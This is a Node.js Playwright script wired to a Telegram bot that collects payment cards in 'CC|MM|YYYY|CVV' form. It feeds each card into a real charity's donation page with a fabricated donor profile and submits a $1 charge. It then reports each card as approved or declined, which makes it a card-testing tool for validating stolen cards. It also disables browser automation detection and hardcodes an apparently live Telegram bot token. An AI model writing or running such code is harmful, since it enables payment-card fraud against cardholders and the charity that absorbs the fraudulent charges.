const { chromium } = require('playwright');
const fs = require('fs');
const http = require('http');

// --- RENDER HTTP PORT BINDING FIX ---
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Bot is running alive!\n');
}).listen(PORT, () => {
    console.log(`HTTP server listening on port ${PORT}`);
});

// --- TELEGRAM BOT CONFIGURATION (HTTP API) ---
const TOKEN = '8973813335:AAG4BTEw5O-lmnhOuApDOp_DmQa0TWBRB60';
let lastUpdateId = 0;
let lastChatId = null; // Store the last user chat ID globally

const logGreen = (text) => console.log(`\x1b[32m${text}\x1b[0m`);
const logRed = (text) => console.log(`\x1b[31m${text}\x1b[0m`);
const logCyan = (text) => console.log(`\x1b[36m${text}\x1b[0m`);

async function sendTelegramMessage(chatId, text) {
    if (!chatId) return;
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' })
        });
    } catch (e) {}
}

// Background Telegram Polling
async function startTelegramPolling() {
    setInterval(async () => {
        try {
            const response = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=1`);
            const data = await response.json();
            
            if (data.ok && data.result.length > 0) {
                for (const update of data.result) {
                    lastUpdateId = update.update_id;
                    if (update.message && update.message.text) {
                        lastChatId = update.message.chat.id; // Save chat ID here
                        const text = update.message.text.trim();

                        // Handle /start command
                        if (text.startsWith('/start')) {
                            await sendTelegramMessage(lastChatId, `👋 *Welcome to the Automation Bot!*\n\nSend your card list using the format:\n\`CC|MM|YYYY|CVV\`\n\nType /cvv for quick instructions.`);
                            continue;
                        }

                        // Handle /cvv command
                        if (text.startsWith('/cvv')) {
                            const cleanText = text.replace('/cvv', '').trim();
                            if (!cleanText.includes('|')) {
                                await sendTelegramMessage(lastChatId, `💳 *Card Submission Guide*\n\nSend cards in this format:\n\`CC|MM|YYYY|CVV\`\n\n*Example:*\n\`4111111111111111|12|2028|123\`\n\nThey will be added straight to the processing queue automatically.`);
                                continue;
                            } else {
                                text = cleanText;
                            }
                        }

                        if (text.startsWith('/')) continue;

                        const incomingLines = text.split('\n').map(l => l.trim()).filter(l => l.length > 0);
                        let addedCount = 0;

                        incomingLines.forEach(line => {
                            if (line.includes('|')) {
                                fs.appendFileSync('cc.txt', line + '\n');
                                addedCount++;
                            }
                        });

                        if (addedCount > 0) {
                            await sendTelegramMessage(lastChatId, `✅ Added ${addedCount} CC(s) to the queue! 🚀 Processing now...`);
                        } else {
                            await sendTelegramMessage(lastChatId, `❌ Invalid format. Please use:\n\`CC|MM|YYYY|CVV\``);
                        }
                    }
                }
            }
        } catch (e) {}
    }, 1000);
}

function generateRandomInfo() {
    const firstNames = ['James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Joseph', 'Thomas', 'Charles', 'Mary', 'Patricia', 'Jennifer', 'Linda', 'Elizabeth', 'Barbara', 'Susan', 'Jessica', 'Sarah', 'Karen'];
    const lastNames = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Miller', 'Davis', 'Garcia', 'Rodriguez', 'Wilson', 'Martinez', 'Anderson', 'Taylor', 'Thomas', 'Hernandez', 'Moore', 'Martin', 'Jackson', 'Thompson', 'White'];
    
    const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
    const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
    
    const areaCodes = ['212', '310', '312', '713', '415', '206', '503', '617', '404', '702'];
    const areaCode = areaCodes[Math.floor(Math.random() * areaCodes.length)];
    const p1 = Math.floor(100 + Math.random() * 900);
    const p2 = Math.floor(1000 + Math.random() * 9000);
    const phone = `${areaCode}${p1}${p2}`;

    const domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'];
    const domain = domains[Math.floor(Math.random() * domains.length)];
    const num = Math.floor(1000 + Math.random() * 9000);
    const email = `${firstName.toLowerCase()}.${lastName.toLowerCase()}${num}@${domain}`;

    return {
        firstName,
        lastName,
        email,
        phone,
        address: '142 West St',
        city: 'New York',
        state: 'New York',
        zip: '10001'
    };
}

(async () => {
    if (!fs.existsSync('cc.txt')) {
        fs.writeFileSync('cc.txt', '');
    }

    startTelegramPolling();

    const browser = await chromium.launch({ 
        headless: true, 
        args: [
            '--disable-blink-features=AutomationControlled',
            '--disable-features=IsolateOrigins,site-per-process',
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-gpu',
            '--ozone-platform=headless',
            '--disable-software-rasterizer'
        ]
    });

    logCyan("Telegram Bot Background Listener & Cloud Automation started...");

    while (true) {
        const fileContent = fs.readFileSync('cc.txt', 'utf-8');
        const lines = fileContent.split('\n').map(line => line.trim()).filter(line => line.length > 0);

        if (lines.length === 0) {
            await new Promise(resolve => setTimeout(resolve, 2000));
            continue;
        }

        const listaInput = lines[0];
        console.log(`\n----------------------------------------`);
        logCyan(`Processing CC: ${listaInput}`);

        const parts = listaInput.split('|');
        if (parts.length < 4) {
            const currentFiles = fs.readFileSync('cc.txt', 'utf-8');
            const updatedLines = currentFiles.split('\n').map(l => l.trim()).filter(l => l.length > 0 && l !== listaInput);
            fs.writeFileSync('cc.txt', updatedLines.join('\n'));
            continue;
        }

        const cc = parts[0].trim();
        const mes = parts[1].trim();
        let ano = parts[2].trim();
        const cvv = parts[3].trim();
        const exp = mes + '/' + (ano.length === 4 ? ano.slice(2) : ano);

        const profile = generateRandomInfo();

        const context = await browser.newContext({
            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
        });
        const page = await context.newPage();
        page.setDefaultNavigationTimeout(30000);

        try {
            await page.goto('https://act.oceana.org/page/141584/donate/1?val&val&val&ea.tracking.id=website&op=DONATE', { waitUntil: 'domcontentloaded' });
            await page.waitForSelector('input[name="transaction.donationAmt"]', { timeout: 30000 });

            // 1. One-Time & $1 amount
            await page.click('text="One-Time"').catch(() => {});
            await page.locator('input[placeholder*="Custom Amount"], input[id*="donationAmtOther"]').first().evaluate((el, val) => {
                el.value = val;
                el.dispatchEvent(new Event('input', { bubbles: true }));
                el.dispatchEvent(new Event('change', { bubbles: true }));
            }, '1').catch(() => {});

            // 2. Country US
            await page.selectOption('select[name="supporter.country"]', { label: 'United States' }).catch(async () => {
                await page.locator('select[name="supporter.country"]').evaluate(el => {
                    el.value = 'US';
                    el.dispatchEvent(new Event('change', { bubbles: true }));
                });
            });

            await page.waitForTimeout(200);

            // 3. Fill personal & address info
            await page.evaluate((p) => {
                const setVal = (selector, val) => {
                    const el = document.querySelector(selector);
                    if (el) {
                        el.value = val;
                        el.dispatchEvent(new Event('input', { bubbles: true }));
                        el.dispatchEvent(new Event('change', { bubbles: true }));
                    }
                };
                setVal('input[name="supporter.firstName"]', p.firstName);
                setVal('input[name="supporter.lastName"]', p.lastName);
                setVal('input[name="supporter.emailAddress"]', p.email);
                setVal('input[name="supporter.phoneNumber"]', p.phone);
                setVal('input[name="supporter.address1"]', p.address);
                setVal('input[name="supporter.city"]', p.city);
                setVal('input[name="supporter.postcode"]', p.zip);

                const stateEl = document.querySelector('select[name="supporter.region"], input[name="supporter.region"]');
                if (stateEl) {
                    stateEl.value = p.state;
                    stateEl.dispatchEvent(new Event('input', { bubbles: true }));
                    stateEl.dispatchEvent(new Event('change', { bubbles: true }));
                }
            }, profile);

            await page.selectOption('select[name="supporter.region"]', { label: 'New York' }).catch(() => {});

            // 4. Fill VGS iframes
            await page.waitForSelector('iframe', { timeout: 5000 }).catch(() => {});
            
            const frames = page.frames();
            for (const frame of frames) {
                try {
                    const ccField = frame.locator('input[autocomplete="cc-number"], input[id*="cc-number"], input[name*="cc-number"]');
                    if (await ccField.count() > 0) {
                        await ccField.evaluate((el, val) => { el.value = val; el.dispatchEvent(new Event('input', { bubbles: true })); }, cc);
                    }
                    const expField = frame.locator('input[autocomplete="cc-exp"], input[id*="cc-exp"], input[name*="cc-exp"]');
                    if (await expField.count() > 0) {
                        await expField.evaluate((el, val) => { el.value = val; el.dispatchEvent(new Event('input', { bubbles: true })); }, exp);
                    }
                    const cvvField = frame.locator('input[autocomplete="cc-csc"], input[id*="cc-csc"], input[name*="cc-csc"]');
                    if (await cvvField.count() > 0) {
                        await cvvField.evaluate((el, val) => { el.value = val; el.dispatchEvent(new Event('input', { bubbles: true })); }, cvv);
                    }
                } catch (e) {}
            }

            await page.waitForTimeout(500);

            // 5. Submit
            const donateBtn = page.locator('button:has-text("Donate"), input[type="submit"], .en__submit').first();
            await donateBtn.click();
            
            await page.waitForTimeout(5000);

            const pageText = await page.innerText('body').catch(() => '');
            const lowerText = pageText.toLowerCase();

            if (lowerText.includes("thank you") && !lowerText.includes("please check") && !lowerText.includes("error") && !lowerText.includes("declined")) {
                logGreen(`>>> [APPROVED] SUCCESS! | CC: ${listaInput} | Amount: $1 <<<`);
                
                const logEntry = `CC: ${listaInput} | Amount: $1 \vert{} Status: APPROVED \vert{} Time:${new Date().toLocaleString()}\n`;
                fs.appendFileSync('results.txt', logEntry);

                const safeCCName = cc.slice(-4);
                await page.screenshot({ path: `result_APPROVED_${safeCCName}.png` });

                // Send success message to Telegram
                await sendTelegramMessage(lastChatId, `✅ *[APPROVED] SUCCESS!*\n\`${listaInput}\`\nAmount: $1`);
            } else {
                logRed(`>>> [DECLINED] FAILED! | CC: ${listaInput} | Amount: $1 <<<`);
                
                // Send failed message to Telegram
                await sendTelegramMessage(lastChatId, `❌ *[DECLINED] FAILED!*\n\`${listaInput}\``);
            }

        } catch (err) {
            logRed(`Processing error: ${err.message}`);
            await sendTelegramMessage(lastChatId, `⚠️ *Error processing:* \`${listaInput}\`\nError: ${err.message}`);
        } finally {
            await context.close();

            const currentFiles = fs.readFileSync('cc.txt', 'utf-8');
            const remainingLines = currentFiles.split('\n').map(line => line.trim()).filter(line => line.length > 0 && line !== listaInput);
            fs.writeFileSync('cc.txt', remainingLines.join('\n'));

            await new Promise(resolve => setTimeout(resolve, 300));
        }
    }
})();
